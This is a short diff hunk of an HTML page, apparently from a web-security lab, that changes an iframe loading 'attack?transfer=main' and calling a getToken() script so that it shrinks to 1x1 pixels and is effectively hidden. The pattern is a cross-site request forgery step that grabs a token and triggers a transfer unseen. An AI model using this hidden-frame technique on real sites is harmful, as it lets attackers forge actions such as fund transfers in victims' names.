@@ -8,7 +8,6 @@ function getToken() {
     xhr.send(null);
 }
 </script>
-
-<iframe id="frame1" src="attack?transfer=main" onload="getToken()">
+<iframe id="frame1" src="attack?transfer=main" onload="getToken()" width="1" height="1">
 
 
